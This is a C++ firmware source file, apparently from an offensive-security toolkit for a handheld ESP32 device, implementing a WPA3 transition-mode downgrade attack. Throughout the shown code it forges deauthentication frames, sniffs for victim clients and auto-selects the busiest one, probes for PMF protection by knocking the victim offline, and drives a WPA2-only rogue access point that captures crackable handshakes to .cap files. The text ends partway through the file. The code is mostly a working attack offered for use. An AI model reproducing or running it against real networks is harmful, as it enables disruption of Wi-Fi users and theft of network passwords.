// AL-ANQA — offensive security firmware for LilyGo T-Deck
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// wpa3down / w3d — WPA3 transition-mode downgrade attack + handshake capture.
//
// WPA3 "transition mode" (SAE + PSK mixed) accepts BOTH WPA3 and WPA2 clients on
// the same SSID for backward compatibility. That fallback is the weakness: deauth
// a WPA3-capable victim off the real AP, stand up a WPA2-PSK-ONLY rogue AP with the
// same SSID/channel, and the victim reconnects over WPA2 — handing us a crackable
// 4-way handshake WPA3-only mode would never expose.
//
// This is almost entirely ORCHESTRATION of existing Al-Anqa parts (coding rule 5b):
//   - target list  = the last `sw` scan, filtered to WPA3/TD APs
//                    (WiFiFunctions::getNetworkSec == WSEC_TD; the Phase-1 detection)
//   - rogue AP + capture = karma's `roguehs` engine — its beacon is already
//                    WPA2-PSK-only (AKM 0x000FAC02, no SAE), it injects its own M1
//                    (known ANonce) and sniffs the victim's M2 → crackable half
//                    handshake, and keeps beacon+M1+M2 raw frames for a .cap.
//   - .cap writer  = shared `pcap::writeRecord` (linktype 105).
//   - deauth       = the same 26-byte broadcast deauth karma's auto mode injects.
//
// Sources / credit (see NOTICES): Dragonblood (CVE-2019-9494..9499, Vanhoef & Ronen),
// TrustedSec Jul-2024 WPA3-downgrade writeup, RedLegg Jun-2025 eaphammer demo.
//
// SCOPE (Phase 2): the core downgrade — deauth + WPA2 rogue AP + capture. Works on
// transition-mode APs with PMF off/optional. PMF-REQUIRED targets block the deauth
// (the victim won't drop); the empirical PMF probe + pre-association flood fallback
// are Phase 3, not built. Output is a .cap crackable with `cc` (or hashcat/aircrack).
//
// Second silent-failure cause = WPA3 "Transition Disable" (Wi-Fi Alliance, mandatory
// in WPA3-certified clients since Dec 2020): the real AP can signal a protected KDE in
// its 4-way handshake telling the client to store "WPA3-only" in its saved network
// profile → the client then refuses our WPA2 rogue for that SSID, no matter how good
// the deauth. It's CLIENT-side state we can't see or detect. In practice enforcement
// is inconsistent (iPhone/Android/Win11 have all been observed still downgrading), so
// it's a POSSIBLE, not certain, blocker — worth suspecting when a modern client that
// clearly reconnects to the real AP never falls to the rogue.

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <SD.h>
#include <strings.h>
#include "wpa3down.h"
#include "display_manager.h"
#include "input_handling.h"
#include "lockscreen_manager.h"
#include "sdcard_manager.h"
#include "wifi_functions.h"
#include "rogue_handshake.h"
#include "dot11.h"
#include "oui_lookup.h"
#include "pcap_writer.h"

extern DisplayManager displayManager;
extern InputHandling  inputHandler;
extern WiFiFunctions  wifiFunctions;
extern SDCardManager  sdCardManager;

#define W3D_MAX_TD 32

// Phase 3 — empirical PMF (802.11w) verdict for the target's victim client.
enum W3dPmf { W3D_PMF_UNK = 0, W3D_PMF_OFF, W3D_PMF_ON };

// ── helpers ─────────────────────────────────────────────────────────────────────

// Broadcast deauth spoofing the REAL AP as source, so its clients drop + re-scan
// and fall to our WPA2 clone. Same frame karma's auto-deauth injects.
static void w3dDeauth(const uint8_t* apBssid) {
    uint8_t f[26] = {0};
    f[0] = 0xC0;                    // mgmt, subtype 12 = deauth
    memset(f + 4, 0xFF, 6);        // DA = broadcast
    memcpy(f + 10, apBssid, 6);    // SA    = real AP
    memcpy(f + 16, apBssid, 6);    // BSSID = real AP
    f[24] = 0x07;                   // reason 7 (class-3 frame from nonassociated STA)
    esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
}

// Directed deauth PAIR against one victim STA — far more effective than broadcast
// (many clients, incl. Linux iwlwifi, ignore broadcast deauths). Sends AP->STA and
// STA->AP so both sides tear the association down. Only lands if PMF is not active.
static void w3dDeauthDir(const uint8_t* apBssid, const uint8_t* sta) {
    uint8_t f[26] = {0};
    f[0] = 0xC0; f[24] = 0x07;
    // AP -> STA
    memcpy(f + 4, sta, 6); memcpy(f + 10, apBssid, 6); memcpy(f + 16, apBssid, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
    // STA -> AP (spoof the victim leaving)
    memcpy(f + 4, apBssid, 6); memcpy(f + 10, sta, 6); memcpy(f + 16, apBssid, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
}

// Parse an "AA:BB:CC:DD:EE:FF" substring anywhere in s → out[6]. Returns true if found.
static bool w3dParseMac(const char* s, uint8_t* out) {
    for (const char* p = s; p && *p; p++) {
        unsigned v[6];
        if (sscanf(p, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) == 6) {
            for (int k = 0; k < 6; k++) out[k] = (uint8_t)v[k];
            return true;
        }
    }
    return false;
}

// SSID → filesystem-safe base (alnum/._-, else '_'); empty → "net".
static void w3dSanitize(const char* in, char* out, size_t n) {
    size_t j = 0;
    for (size_t i = 0; in[i] && j < n - 1; i++) {
        char c = in[i];
        out[j++] = (isalnum((int)c) || c == '.' || c == '_' || c == '-') ? c : '_';
    }
    if (j == 0 && n > 3) { out[j++] = 'n'; out[j++] = 'e'; out[j++] = 't'; }
    out[j] = '\0';
}

// Save beacon + M1 + M2 to /apps/wpa3down/<ssid>.cap (never overwrite). Returns the
// basename in outName. GDMA: call only AFTER roguehs::end() (WiFi idle STA).
static bool w3dSaveCap(const char* ssid, const roguehs::State& s, char* outName, size_t n) {
    if (outName && n) outName[0] = '\0';
    if (!sdCardManager.canAccessSD() || !s.gotM2 || !s.m2RawLen) return false;
    sdCardManager.ensureDir(SD_DIR_WPA3DOWN);
    char safe[40]; w3dSanitize(ssid, safe, sizeof(safe));
    char base[48], fname[96];
    snprintf(base, sizeof(base), "%s.cap", safe);
    snprintf(fname, sizeof(fname), SD_DIR_WPA3DOWN "/%s", base);
    for (int i = 1; SD.exists(fname) && i < 1000; i++) {
        snprintf(base, sizeof(base), "%s-%d.cap", safe, i);
        snprintf(fname, sizeof(fname), SD_DIR_WPA3DOWN "/%s", base);
    }
    File cap = SD.open(fname, FILE_WRITE);
    if (!cap) return false;
    pcap::writeGlobalHeader(cap);
    uint32_t t = s.capTs ? s.capTs : millis();
    if (s.beaconLen) pcap::writeRecord(cap, s.beacon, s.beaconLen, t > 20 ? t - 20 : 0);
    if (s.m1RawLen)  pcap::writeRecord(cap, s.m1Raw,  s.m1RawLen,  t > 10 ? t - 10 : 0);
    pcap::writeRecord(cap, s.m2Raw, s.m2RawLen, t);
    cap.flush(); cap.close();
    if (outName && n) { strncpy(outName, base, n - 1); outName[n - 1] = '\0'; }
    return true;
}

static void w3dBssidStr(const uint8_t* b, char* out) {
    snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", b[0], b[1], b[2], b[3], b[4], b[5]);
}

// ── Phase 3 Part 1: empirical PMF (802.11w) probe ─────────────────────────────────
// Deciding whether an AP enforces PMF from its beacon flags is unreliable — a modern
// client negotiates PMF even when the AP only marks it "capable". So we test the
// *client* empirically: knock it with a directed deauth burst and watch, in
// promiscuous, how the victim reacts on the real AP's channel:
//   - it emits fresh auth / (re)assoc requests  → the deauth DROPPED it   → PMF OFF
//   - its data frames to the AP keep flowing     → the deauth was IGNORED → PMF ON
//   - it was idle / went silent with no re-auth  → INCONCLUSIVE
// Single-radio, mostly passive with one short TX burst. Needs a victim MAC.
// Method: IEEE 802.11-2016 §12 (PMF applies only AFTER association); pre-assoc
// deauth-flood technique per eaphammer (already credited, NOTICES Dragonblood entry).

static volatile uint32_t s_ppData, s_ppReauth, s_ppDeauth;
static uint8_t s_ppVictim[6], s_ppBssid[6];

static void IRAM_ATTR w3dProbeCb(void* buf, wifi_promiscuous_pkt_type_t t) {
    const wifi_promiscuous_pkt_t* pp = (const wifi_promiscuous_pkt_t*)buf;
    const uint8_t* d = pp->payload;
    uint16_t len = pp->rx_ctrl.sig_len;
    if (len < 24) return;
    uint8_t ft = dot11::fType(d), st = dot11::fSubtype(d);
    const uint8_t* a1 = d + 4;      // receiver / DA
    const uint8_t* a2 = d + 10;     // transmitter / SA
    if (ft == 0) {                                          // management
        if (st == 11 || st == dot11::ST_ASSOC_REQ || st == 2) {   // auth / (re)assoc req
            if (memcmp(a2, (const void*)s_ppVictim, 6) == 0 &&
                memcmp(a1, (const void*)s_ppBssid, 6) == 0) s_ppReauth++;
        } else if (st == dot11::ST_DEAUTH || st == dot11::ST_DISASSOC) {
            if (memcmp(a1, (const void*)s_ppVictim, 6) == 0 ||
                memcmp(a2, (const void*)s_ppVictim, 6) == 0) s_ppDeauth++;
        }
    } else if (ft == 2) {                                   // data — victim <-> real AP
        if ((memcmp(a2, (const void*)s_ppVictim, 6) == 0 ||
             memcmp(a1, (const void*)s_ppVictim, 6) == 0) &&
            memcmp(dot11::dataBssid(d), (const void*)s_ppBssid, 6) == 0) s_ppData++;
    }
}

// Small live line under the probe chrome. `data`/`reauth` are the live counters.
static void w3dProbeLine(const char* phase, uint16_t phaseColor) {
    int y = outputY + 5 * LINE_HEIGHT;
    displayManager.fillRect(0, y - 1, SCREEN_WIDTH, 2 * LINE_HEIGHT, TFT_BLACK);
    displayManager.setCursor(6, y);
    displayManager.setTextColor(phaseColor); displayManager.printText(phase);
    displayManager.setCursor(6, y + LINE_HEIGHT);
    char l[40];
    snprintf(l, sizeof(l), "data %lu   re-auth %lu",
             (unsigned long)s_ppData, (unsigned long)s_ppReauth);
    displayManager.setTextColor(TFT_WHITE); displayManager.printText(l);
}

// Timed wait that keeps the probe line live and honours [q]. Returns true if aborted.
static bool w3dProbeWait(uint32_t ms, const char* phase, uint16_t color) {
    uint32_t t0 = millis(), lastDraw = 0;
    while (millis() - t0 < ms) {
        if (!displayManager.isBlocked() && millis() - lastDraw > 200) {
            w3dProbeLine(phase, color); lastDraw = millis();
        }
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') return true;
        delay(10);
    }
    return false;
}

// Run the probe. Leaves WiFi idle STA (SD-safe). Fills detail[] with a summary.
static W3dPmf w3dRunPmfProbe(const uint8_t* bssid, int ch, const uint8_t* victim,
                             char* detail, size_t dn) {
    memcpy((void*)s_ppVictim, victim, 6);
    memcpy((void*)s_ppBssid, bssid, 6);
    s_ppData = s_ppReauth = s_ppDeauth = 0;

    // chrome
    char bs[18], vs[18]; w3dBssidStr(bssid, bs); w3dBssidStr(victim, vs);
    displayManager.clearScreen();
    displayManager.setDefaultTextSize();
    displayManager.setCursor(10, outputY);
    displayManager.setTextColor(0x7BEF);     displayManager.printText("[");
    displayManager.setTextColor(TFT_CYAN);   displayManager.printText("W3D");
    displayManager.setTextColor(0x7BEF);     displayManager.printText("::");
    displayManager.setTextColor(TFT_YELLOW); displayManager.printText("PMF-PROBE");
    displayManager.setTextColor(0x7BEF);     displayManager.println("]");
    displayManager.setCursor(10, outputY + LINE_HEIGHT);
    displayManager.setTextColor(0x7BEF);   displayManager.printText("AP  ");
    displayManager.setTextColor(TFT_WHITE); displayManager.println(bs);
    displayManager.setCursor(10, outputY + 2 * LINE_HEIGHT);
    displayManager.setTextColor(0x7BEF);   displayManager.printText("STA ");
    displayManager.setTextColor(TFT_WHITE); displayManager.printText(vs);
    char chs[10]; snprintf(chs, sizeof(chs), "  ch%d", ch);
    displayManager.setTextColor(0x7BEF); displayManager.println(chs);
    displayManager.setCursor(0, outputY + 3 * LINE_HEIGHT + 2); displayManager.printSeparator();
    displayManager.setCursor(0, 210); displayManager.printSeparator();
    displayManager.setCursor(6, 214);
    displayManager.setTextColor(0x7BEF); displayManager.printText("[q] abort");
    displayManager.setTextColor(TFT_WHITE);

    // bring up promiscuous on the target channel
    WiFi.disconnect(false);
    WiFi.mode(WIFI_STA);
    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(w3dProbeCb);
    esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE);

    bool aborted = false;

    // Phase A — baseline (2 s): how active is the victim on the real AP?
    aborted = w3dProbeWait(2000, "baseline...", TFT_CYAN);
    uint32_t baseData     = s_ppData;
    uint32_t reauthBefore = s_ppReauth;

    // Phase B — deauth burst (~1.2 s): try to knock the victim off the real AP.
    for (int i = 0; i < 8 && !aborted; i++) {
        w3dDeauthDir(bssid, victim);      // directed pair (lands only if PMF off)
        w3dDeauth(bssid);                 // + broadcast
        aborted = w3dProbeWait(150, "deauth burst...", TFT_RED);
    }
    uint32_t postStart = s_ppData;

    // Phase C — observe (2.5 s): reconnect? did data stop?
    if (!aborted) aborted = w3dProbeWait(2500, "watching...", TFT_YELLOW);
    uint32_t reauth   = s_ppReauth - reauthBefore;
    uint32_t postData = s_ppData - postStart;

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    WiFi.mode(WIFI_STA);

    if (aborted) { if (dn) snprintf(detail, dn, "aborted"); return W3D_PMF_UNK; }

    // Verdict. Fresh auth/assoc from the victim is the clean discriminator; failing
    // that, sustained data through the burst = deauth ignored = PMF on.
    if (reauth > 0) {
        if (dn) snprintf(detail, dn, "re-auth x%lu after deauth", (unsigned long)reauth);
        return W3D_PMF_OFF;
    }
    if (baseData < 4) {
        if (dn) snprintf(detail, dn, "victim idle (%lu frames)", (unsigned long)baseData);
        return W3D_PMF_UNK;
    }
    if (postData >= baseData / 2) {
        if (dn) snprintf(detail, dn, "data flowed thru deauth (%lu/%lu)",
                         (unsigned long)postData, (unsigned long)baseData);
        return W3D_PMF_ON;
    }
    if (dn) snprintf(detail, dn, "traffic dropped, no re-auth seen");
    return W3D_PMF_UNK;   // dropped but silent — can't confirm downgrade
}

// Show the verdict. probeOnly → any key returns (false). Attack path → any key
// starts (true), [q] cancels (false).
static bool w3dShowVerdict(const char* ssid, W3dPmf pmf, const char* det, bool probeOnly) {
    displayManager.clearScreen();
    displayManager.setDefaultTextSize();
    displayManager.setCursor(10, outputY);
    displayManager.setTextColor(0x7BEF);     displayManager.printText("[");
    displayManager.setTextColor(TFT_CYAN);   displayManager.printText("W3D");
    displayManager.setTextColor(0x7BEF);     displayManager.printText("::");
    displayManager.setTextColor(TFT_YELLOW); displayManager.printText("PMF");
    displayManager.setTextColor(0x7BEF);     displayManager.println("]");
    displayManager.setCursor(10, outputY + LINE_HEIGHT);
    displayManager.setTextColor(0x7BEF);   displayManager.printText("Target: ");
    displayManager.setTextColor(TFT_WHITE); displayManager.println(ssid[0] ? ssid : "<hidden>");

    displayManager.setCursor(10, outputY + 3 * LINE_HEIGHT);
    if (pmf == W3D_PMF_OFF) {
        displayManager.setTextColor(TFT_GREEN);
        displayManager.println("PMF OFF - downgrade should work");
    } else if (pmf == W3D_PMF_ON) {
        displayManager.setTextColor(TFT_RED);
        displayManager.println("PMF ON - deauth blocked");
        displayManager.setCursor(10, outputY + 4 * LINE_HEIGHT);
        displayManager.setTextColor(TFT_YELLOW);
        displayManager.println("pre-assoc flood only (disrupts re-joins)");
    } else {
        displayManager.setTextColor(TFT_YELLOW);
        displayManager.println("INCONCLUSIVE");
    }
    displayManager.setCursor(10, outputY + 5 * LINE_HEIGHT);
    displayManager.setTextColor(0x7BEF); displayManager.println(det);

    displayManager.setCursor(0, 210); displayManager.printSeparator();
    displayManager.setCursor(6, 214);
    displayManager.setTextColor(0x7BEF);
    displayManager.printText(probeOnly ? "[any] back" : "[q] cancel   any key = start attack");
    displayManager.setTextColor(TFT_WHITE);

    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (!k) {
            if (LockScreenManager::getInstance().consumeJustUnlocked()) { /* stays */ }
            delay(20); continue;
        }
        if (probeOnly) return false;
        if (k == 'q' || k == 'Q') return false;
        return true;
    }
}

// ── Phase 3: client auto-discovery (pick a victim without typing a MAC) ───────────
// Sniff the target AP's channel for data frames to/from its BSSID → the STA MACs are
// its active clients (wm's client-detection logic). Freeze the list and let the
// operator trackball-pick one, or [a] auto-pick the busiest — so `w3d`/`w3d probe`
// never need a hand-typed victim MAC. Reuses dot11 + oui_lookup + the picker style.
#define W3D_MAX_CL 16

struct W3dClient { uint8_t mac[6]; uint16_t hits; int8_t rssi; };

struct W3dClEvt { uint8_t mac[6]; int8_t rssi; };
#define W3D_CL_RING 24
static volatile W3dClEvt s_clRing[W3D_CL_RING];
static volatile uint8_t  s_clHead, s_clTail;
static uint8_t           s_clBssid[6];

static void IRAM_ATTR w3dClientCb(void* buf, wifi_promiscuous_pkt_type_t t) {
    const wifi_promiscuous_pkt_t* pp = (const wifi_promiscuous_pkt_t*)buf;
    const uint8_t* d = pp->payload;
    uint16_t len = pp->rx_ctrl.sig_len;
    if (len < 24 || dot11::fType(d) != 2) return;         // data frames = active clients
    bool td = dot11::toDS(d), fd = dot11::fromDS(d);
    const uint8_t* cli = nullptr;
    if (td && !fd)      { if (memcmp(d + 4,  (const void*)s_clBssid, 6) == 0) cli = d + 10; } // STA->AP
    else if (fd && !td) { if (memcmp(d + 10, (const void*)s_clBssid, 6) == 0) cli = d + 4;  } // AP->STA
    if (!cli || (cli[0] & 0x01)) return;                  // none / multicast
    uint8_t nx = (s_clHead + 1) % W3D_CL_RING;
    if (nx == s_clTail) return;
    W3dClEvt& e = (W3dClEvt&)s_clRing[s_clHead];
    memcpy(e.mac, cli, 6); e.rssi = pp->rx_ctrl.rssi;
    s_clHead = nx;
}

// Sniff ~5 s, draining the ring into `tbl` (dedup by MAC, hits/rssi tracked).
// Returns client count, or -1 if the operator pressed [q]. Leaves promiscuous OFF.
static int w3dSniffClients(int ch, W3dClient* tbl) {
    s_clHead = s_clTail = 0;
    WiFi.disconnect(false);
    WiFi.mode(WIFI_STA);
    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(w3dClientCb);
    esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE);

    int n = 0; bool aborted = false;
    uint32_t t0 = millis(), lastDraw = 0;
    while (millis() - t0 < 5000) {
        while (s_clTail != s_clHead) {
            W3dClEvt e; memcpy(&e, (const void*)&s_clRing[s_clTail], sizeof(e));
            s_clTail = (s_clTail + 1) % W3D_CL_RING;
            int idx = -1;
            for (int i = 0; i < n; i++) if (memcmp(tbl[i].mac, e.mac, 6) == 0) { idx = i; break; }
            if (idx < 0 && n < W3D_MAX_CL) { idx = n++; memcpy(tbl[idx].mac, e.mac, 6); tbl[idx].hits = 0; }
            if (idx >= 0) { tbl[idx].hits++; tbl[idx].rssi = e.rssi; }
        }
        if (!displayManager.isBlocked() && millis() - lastDraw > 250) {
            int y = outputY + 5 * LINE_HEIGHT;
            displayManager.fillRect(0, y - 1, SCREEN_WIDTH, LINE_HEIGHT, TFT_BLACK);
            displayManager.setCursor(6, y);
            char l[40];
            snprintf(l, sizeof(l), "found %d   %lus left", n,
                     (unsigned long)((5000 - (millis() - t0)) / 1000));
            displayManager.setTextColor(TFT_WHITE); displayManager.printText(l);
            lastDraw = millis();
        }
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') { aborted = true; break; }
        delay(10);
    }
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    WiFi.mode(WIFI_STA);
    if (aborted) return -1;
    // sort busiest-first (insertion; <=16 rows)
    for (int i = 1; i < n; i++) {
        W3dClient tmp = tbl[i]; int j = i - 1;
        while (j >= 0 && tbl[j].hits < tmp.hits) { tbl[j + 1] = tbl[j]; j--; }
        tbl[j + 1] = tmp;
    }
    return n;
}

static void w3dDrawClientList(const W3dClient* tbl, int n, int sel) {
    displayManager.clearScreen();
    displayManager.setDefaultTextSize();
    displayManager.setCursor(10, outputY);
    displayManager.setTextColor(0x7BEF);     displayManager.printText("[");
    displayManager.setTextColor(TFT_CYAN);   displayManager.printText("W3D");
    displayManager.setTextColor(0x7BEF);     displayManager.printText("::");
    displayManager.setTextColor(TFT_YELLOW); displayManager.printText("CLIENT");
    displayManager.setTextColor(0x7BEF);     displayManager.println("]");
    displayManager.setCursor(10, outputY + LINE_HEIGHT);
    displayManager.setTextColor(0x7BEF);
    displayManager.println(n == 0 ? "No active clients seen." : "Pick the victim client:");
    displayManager.setCursor(0, outputY + 2 * LINE_HEIGHT + 2);
    displayManager.printSeparator();

    int listTop = outputY + 3 * LINE_HEIGHT;
    for (int k = 0; k < n && k < 8; k++) {
        int y = listTop + k * LINE_HEIGHT;
        bool srow = (k == sel);
        if (srow) displayManager.fillRect(0, y - 1, SCREEN_WIDTH, LINE_HEIGHT, 0x0841);
        displayManager.setCursor(2, y);
        displayManager.setTextColor(srow ? TFT_YELLOW : 0x7BEF);
        displayManager.printText(srow ? ">" : " ");
        char mac[18]; w3dBssidStr(tbl[k].mac, mac);
        displayManager.setTextColor(TFT_WHITE); displayManager.printText(mac);
        const char* ven = ouiVendor(tbl[k].mac);   // nullptr for unknown OUIs
        char meta[24];
        snprintf(meta, sizeof(meta), " %-7.7s %d", ven ? ven : "?", tbl[k].rssi);
        displayManager.setTextColor(0x7BEF); displayManager.printText(meta);
    }
    displayManager.setCursor(0, 210);
    displayManager.printSeparator();
    displayManager.setCursor(6, 214);
    displayManager.setTextColor(0x7BEF);
    displayManager.printText(n == 0 ? "[u]rescan  [b]broadcast  [q]cancel"
                                    : "trkbl/ent pick [a]auto [u]resc [b]bcast [q]");
    displayManager.setTextColor(TFT_WHITE);
}

// Discover the target AP's clients and pick one. Returns 1 = client picked (out set),
// 0 = fall back to broadcast (no victim), -1 = cancelled. `autoPick` skips the picker
// and takes the busiest client when any are found.
static int w3dPickClient(const uint8_t* bssid, int ch, bool autoPick, uint8_t* out) {
    memcpy(s_clBssid, bssid, 6);
    W3dClient tbl[W3D_MAX_CL];

    // sniff chrome (kept behind the live "found N" line drawn by w3dSniffClients)
    displayManager.clearScreen();
    displayManager.setCursor(10, outputY);
    displayManager.setTextColor(0x7BEF);     displayManager.printText("[");
    displayManager.setTextColor(TFT_CYAN);   displayManager.printText("W3D");
    displayManager.setTextColor(0x7BEF);     displayManager.printText("::");
    displayManager.setTextColor(TFT_YELLOW); displayManager.printText("SNIFF");
    displayManager.setTextColor(0x7BEF);     displayManager.println("]");
    displayManager.setCursor(10, outputY + LINE_HEIGHT);
    displayManager.setTextColor(0x7BEF);     displayManager.println("Finding clients on the AP...");
    displayManager.setCursor(0, 210); displayManager.printSeparator();
    displayManager.setCursor(6, 214);
    displayManager.setTextColor(0x7BEF); displayManager.printText("[q] abort");
    displayManager.setTextColor(TFT_WHITE);

    int n = w3dSniffClients(ch, tbl);
    if (n < 0) return -1;                                  // aborted mid-sniff
    if (autoPick && n > 0) { memcpy(out, tbl[0].mac, 6); return 1; }

    int  sel = 0;
    bool redraw = true;
    while (true) {
        int vis = n < 8 ? n : 8;                          // only the top 8 are shown/pickable
        if (redraw) { w3dDrawClientList(tbl, n, sel); redraw = false; }

        TrackballEvent tb = inputHandler.getTrackballEvent();
        if (tb == TBALL_UP)    { if (sel > 0)       { sel--; redraw = true; } continue; }
        if (tb == TBALL_DOWN)  { if (sel < vis - 1) { sel++; redraw = true; } continue; }
        if (tb == TBALL_CLICK) { if (n > 0) { memcpy(out, tbl[sel].mac, 6); return 1; } continue; }

        char k = inputHandler.getKeyboardInput();
        if (!k) { if (LockScreenManager::getInstance().consumeJustUnlocked()) redraw = true; continue; }
        if (k == '\r' || k == '\n' || k == 'a' || k == 'A') {
            int pick = (k == 'a' || k == 'A') ? 0 : sel;
            if (n > 0) { memcpy(out, tbl[pick].mac, 6); return 1; }
            continue;
        }
        if (k == 'u' || k == 'U') {
            displayManager.clearScreen();
            displayManager.setCursor(10, outputY + LINE_HEIGHT);
            displayManager.setTextColor(0x7BEF); displayManager.println("Re-sniffing clients...");
            displayManager.setTextColor(TFT_WHITE);
            n = w3dSniffClients(ch, tbl);
            if (n < 0) return -1;
            if (sel >= n) sel = 0;
            redraw = true; continue;
        }
        if (k == 'b' || k == 'B') return 0;               // broadcast, no victim
        if (k == 'q' || k == 'Q') return -1;
    }
}

// ── target picker (TD-filtered last-scan list) ───────────────────────────────────

static int w3dPickTarget(const int* tdIdx, int tdCount) {
    int  sel = 0;
    bool redraw = true;
    while (true) {
        if (redraw) {
            displayManager.clearScreen();
            displayManager.setCursor(10, outputY);
            displayManager.setDefaultTextSize();
            displayManager.setTextColor(0x7BEF);     displayManager.printText("[");
            displayManager.setTextColor(TFT_CYAN);   displayManager.printText("W3D");
            displayManager.setTextColor(0x7BEF);     displayManager.printText("::");
            displayManager.setTextColor(TFT_YELLOW); displayManager.printText("TARGET");
            displayManager.setTextColor(0x7BEF);     displayManager.println("]");
            displayManager.setCursor(10, outputY + LINE_HEIGHT);
            displayManager.setTextColor(0x7BEF);
            displayManager.println("Transition-mode (WPA3/TD) APs:");
            displayManager.setCursor(0, outputY + 2 * LINE_HEIGHT + 2);
            displayManager.printSeparator();

            int listTop = outputY + 3 * LINE_HEIGHT;
            for (int k = 0; k < tdCount; k++) {
                int i = tdIdx[k];
                char ssid[33]; wifiFunctions.getNetworkSSID(i, ssid);
                uint8_t b[6]; int ch = 0; wifiFunctions.getNetworkInfo(i, b, &ch);
                int  y      = listTop + k * LINE_HEIGHT;
                bool selrow = (k == sel);
                if (selrow) displayManager.fillRect(0, y - 1, SCREEN_WIDTH, LINE_HEIGHT, 0x0841);
                displayManager.setCursor(2, y);
                displayManager.setTextColor(selrow ? TFT_YELLOW : 0x7BEF);
                displayManager.printText(selrow ? ">" : " ");
                char idx[5]; snprintf(idx, sizeof(idx), "%2d ", i);
                displayManager.setTextColor(TFT_YELLOW); displayManager.printText(idx);
                char name[15]; snprintf(name, sizeof(name), "%-14.14s", ssid[0] ? ssid : "<hidden>");
                displayManager.setTextColor(ssid[0] ? TFT_WHITE : 0x7BEF);
                displayManager.printText(name);
                char meta[16]; snprintf(meta, sizeof(meta), " ch%-2d", ch);
                displayManager.setTextColor(0x7BEF);    displayManager.printText(meta);
                displayManager.setTextColor(TFT_YELLOW); displayManager.printText(" WPA3/TD");
            }

            displayManager.setCursor(0, 210);
            displayManager.printSeparator();
            displayManager.setCursor(6, 214);
            displayManager.setTextColor(0x7BEF);
            displayManager.printText("trkbl=sel  click/ent=pick  [q]cancel");
            displayManager.setTextColor(TFT_WHITE);
            redraw = false;
        }

        TrackballEvent tb = inputHandler.getTrackballEvent();
        if (tb == TBALL_UP)    { if (sel > 0)            { sel--; redraw = true; } continue; }
        if (tb == TBALL_DOWN)  { if (sel < tdCount - 1)  { sel++; redraw = true; } continue; }
        if (tb == TBALL_CLICK) { return tdIdx[sel]; }

        char k = inputHandler.getKeyboardInput();
        if (!k) { if (LockScreenManager::getInstance().consumeJustUnlocked()) redraw = true; continue; }
        if (k == 'q' || k == 'Q') return -1;
        if (k == '\r' || k == '\n') return tdIdx[sel];
    }
}

// ── attack screen drawing ─────────────────────────────────────────────────────────

static void w3dDrawChrome(const char* ssid, const uint8_t* bssid, int ch, W3dPmf pmf,
                          const uint8_t* victim) {
    char bs[18]; w3dBssidStr(bssid, bs);
    displayManager.clearScreen();
    displayManager.setDefaultTextSize();

    displayManager.setCursor(10, outputY);
    displayManager.setTextColor(0x7BEF);     displayManager.printText("[");
    displayManager.setTextColor(TFT_CYAN);   displayManager.printText("W3D");
    displayManager.setTextColor(0x7BEF);     displayManager.printText("::");
    displayManager.setTextColor(TFT_YELLOW); displayManager.printText("DOWNGRADE");
    displayManager.setTextColor(0x7BEF);     displayManager.println("]");

    displayManager.setCursor(10, outputY + LINE_HEIGHT);
    displayManager.setTextColor(0x7BEF);   displayManager.printText("Target: ");
    displayManager.setTextColor(TFT_WHITE); displayManager.println(ssid[0] ? ssid : "<hidden>");
    displayManager.setCursor(10, outputY + 2 * LINE_HEIGHT);
    displayManager.setTextColor(0x7BEF); displayManager.printText(bs);
    char chs[10]; snprintf(chs, sizeof(chs), "  ch%d", ch);
    displayManager.printText(chs);
    displayManager.setTextColor(TFT_YELLOW); displayManager.printText("  WPA3/TD");

    displayManager.setCursor(10, outputY + 3 * LINE_HEIGHT);
    displayManager.setTextColor(TFT_GREEN); displayManager.printText("Rogue AP: ");
    displayManager.setTextColor(TFT_WHITE); displayManager.printText(ssid[0] ? ssid : "<hidden>");
    displayManager.setTextColor(TFT_RED);   displayManager.printText(" [WPA2-ONLY]");

    displayManager.setCursor(0, outputY + 4 * LINE_HEIGHT + 2);
    displayManager.printSeparator();
    displayManager.setCursor(6, outputY + 5 * LINE_HEIGHT);
    if (victim) {
        char vs[26];
        snprintf(vs, sizeof(vs), "Deauth STA %02X:%02X:%02X:%02X:%02X:%02X",
                 victim[0], victim[1], victim[2], victim[3], victim[4], victim[5]);
        displayManager.setTextColor(TFT_GREEN); displayManager.println(vs);
    } else {
        displayManager.setTextColor(TFT_YELLOW);
        displayManager.println("Deauth: broadcast (add victim MAC)");
    }

    displayManager.setCursor(6, outputY + 8 * LINE_HEIGHT);
    if (pmf == W3D_PMF_ON) {
        displayManager.setTextColor(TFT_RED);
        displayManager.println("Mode: PRE-ASSOC FLOOD (PMF on)");
    } else if (pmf == W3D_PMF_OFF) {
        displayManager.setTextColor(TFT_GREEN);
        displayManager.println("Mode: DEAUTH DOWNGRADE (PMF off)");
    } else {
        displayManager.setTextColor(TFT_YELLOW);
        displayManager.println("PMF unknown - may not drop");
    }

    displayManager.setCursor(0, 210);
    displayManager.printSeparator();
    displayManager.setCursor(6, 214);
    displayManager.setTextColor(0x7BEF);
    displayManager.printText("[q] stop");
    displayManager.setTextColor(TFT_WHITE);
}

